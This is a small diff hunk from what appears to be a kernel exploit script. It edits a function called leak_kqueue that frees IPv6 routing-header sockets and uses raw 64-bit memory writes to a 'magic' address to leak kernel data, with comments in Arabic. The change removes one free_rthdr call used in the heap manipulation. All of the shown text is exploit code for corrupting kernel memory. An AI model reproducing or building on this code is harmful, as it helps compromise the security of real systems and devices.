@@ -1639,8 +1639,7 @@ function leak_kqueue() {
       log('leak_kqueue: kqueue() failed');
       return false;
     }
-    // نحرر triplets[1] عشان نستخدمه في التسريب
-    free_rthdr(ipv6_socks[triplets[1]]);
+
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     nanosleep_fun(0);
     write64(magic_add, 0);
